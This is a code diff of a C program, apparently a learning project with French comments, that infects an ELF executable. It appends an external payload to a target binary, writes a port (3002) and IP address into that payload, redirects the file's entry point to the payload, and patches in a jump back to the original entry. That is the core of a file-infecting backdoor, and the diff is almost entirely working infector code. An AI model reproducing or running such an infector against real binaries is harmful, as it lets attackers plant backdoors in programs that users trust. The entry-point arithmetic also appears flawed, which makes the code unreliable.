@@ -1,80 +1,113 @@
-#include <stdint.h>
 #include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
 #include <fcntl.h>
 #include <unistd.h>
-#include <string.h>
-#include <stdlib.h>
-#include <sys/syscall.h>
-#include <sys/mman.h>
-#include <sys/types.h>
 #include <arpa/inet.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/wait.h>
 
-extern void _payload(void);
-extern uint64_t _payload_size;
+#ifdef __APPLE__
+#define CDECL_NORM(x) x
+#else
+#define CDECL_NORM(x) _ ## x
+#endif /* __APPLE__ */
+
+extern uint8_t CDECL_NORM(payload);
+extern uint64_t CDECL_NORM(payload_size);
+
+#define payload_p &CDECL_NORM(payload)
+#define payload_size_p CDECL_NORM(payload_size)
 
 uint16_t port = 0;
 uint32_t addr_ip = 0;
 
-int main()
+int main(int argc, char *argv[], char *envp[])
 {
-	port = htons(3002);
-	addr_ip = htonl(INADDR_ANY);
-	printf("port: %#x %#x\n", port, addr_ip);
+    port = htons(3002);
+    addr_ip = htonl(INADDR_ANY);
+    printf("port: %#x %#x\n", port, addr_ip);
 
-	// int fd = open("/home/mgama/.zsh_history", O_RDONLY);
-	int fd = open("testprog", O_RDWR);
-	if (fd < 0) {
-		perror("open");
-		return 1;
-	}
+    int fd = open("testprog", O_RDWR);
+    if (fd < 0) {
+        perror("open");
+        return 1;
+    }
 
-	size_t payload_size = 1500;
-	// void *payload = malloc(payload_size);
-	// if (payload == NULL) {
-	// 	perror("malloc");
-	// 	return 1;
-	// }
-	// memcpy(payload, _payload, payload_size);
+    printf("payload size: %p, %#lx\n", payload_p, payload_size_p);
 
-	size_t size = lseek(fd, 0, SEEK_END);
-	void *data = mmap(NULL, size + payload_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
-	if (data == MAP_FAILED) {
-		perror("mmap");
-		return 1;
-	}
+    size_t size = lseek(fd, 0, SEEK_END);
+    if (size == (size_t) -1) {
+        perror("lseek");
+        close(fd);
+        return 1;
+    }
+    printf("size of the file: %zu\n", size);
 
-	printf("data: %p\n", data);
+    // Agrandir le fichier pour accueillir les nouvelles données
+    if (ftruncate(fd, size + payload_size_p) == -1) {
+        perror("ftruncate");
+        close(fd);
+        return 1;
+    }
 
-	// data = syscall(SYS_mremap, data, size, size + payload_size, 1);
-    // if (data == MAP_FAILED) {
-    //     perror("mremap");
-    //     return 1;
-    // }
+    // Lire le header du fichier
+    uint8_t header[64];
+    if (pread(fd, header, sizeof(header), 0) != sizeof(header)) {
+        perror("pread");
+        close(fd);
+        return 1;
+    }
 
-	uint32_t entry_point_offset = 0x18;
-	uint64_t entry_point = *(uint64_t *)(data + entry_point_offset);
+    uint32_t entry_point_offset = 0x18;
+    uint64_t entry_point = *(uint64_t *)(header + entry_point_offset);
 
-	printf("end of data: %x\n", data + size);
+    printf("entry point: %#lx\n", entry_point);
 
-	printf("entry point: %#lx\n", *(uint64_t *)(data + size - 8));
+    // Ecrire le payload à la fin du fichier
+    if (pwrite(fd, payload_p, payload_size_p, size) != payload_size_p) {
+        perror("pwrite");
+        close(fd);
+        return 1;
+    }
 
-	printf("size: %p, %p, %p\n", data, size, data + size);
-	memcpy(data + size, &_payload, payload_size);
-	memcpy(data + size + payload_size - 4 - 2, &port, 2);
-	memcpy(data + size + payload_size - 4, &addr_ip, 4);
+    // Ecrire le port et l'adresse IP dans le payload
+    if (pwrite(fd, &port, sizeof(port), size + payload_size_p - 4 - 2) != sizeof(port)) {
+        perror("pwrite");
+        close(fd);
+        return 1;
+    }
 
-	// set new entry point
-	memcpy(data + entry_point_offset, data + size, 4);
+    if (pwrite(fd, &addr_ip, sizeof(addr_ip), size + payload_size_p - 4) != sizeof(addr_ip)) {
+        perror("pwrite");
+        close(fd);
+        return 1;
+    }
 
-	// set jump to original entry point
-	uint64_t jump = entry_point - (size + 4);
-	memcpy(data + size + payload_size - 4 - 2 - 8, &jump, 4);
+    // Mettre à jour le point d'entrée dans le header
+    uint32_t new_entry_point = size;
+    memcpy(header + entry_point_offset, &new_entry_point, sizeof(new_entry_point));
 
-	printf("jump: %#p\n", data);
-	write(1, data, size + payload_size);
-	close(fd);
+    // Ecrire le nouveau header dans le fichier
+    if (pwrite(fd, header, sizeof(header), 0) != sizeof(header)) {
+        perror("pwrite");
+        close(fd);
+        return 1;
+    }
 
-	munmap(data, size + payload_size);
+    // Mettre à jour le saut dans le payload
+    uint64_t jump = entry_point - (size + 4);
+    if (pwrite(fd, &jump, sizeof(jump), size + payload_size_p - 4 - 2 - 8) != sizeof(jump)) {
+        perror("pwrite");
+        close(fd);
+        return 1;
+    }
 
-	return 0;
+    printf("Modification completed successfully.\n");
+
+    close(fd);
+
+    return 0;
 }
